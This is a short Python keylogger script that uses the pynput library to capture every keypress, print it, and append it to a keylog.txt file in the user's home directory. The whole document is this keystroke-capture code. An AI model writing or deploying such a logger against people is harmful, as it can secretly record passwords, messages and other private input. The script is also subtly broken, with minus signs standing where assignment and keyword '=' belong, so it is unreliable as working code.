from pynput import keyboard
import os

LOG_FILE - os.path.expanduser("~/keylog.txt")

def on_press(key):
    try:
        print(f"Key pressed: {key}")
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press-on_press) as listener:
    listener.join()
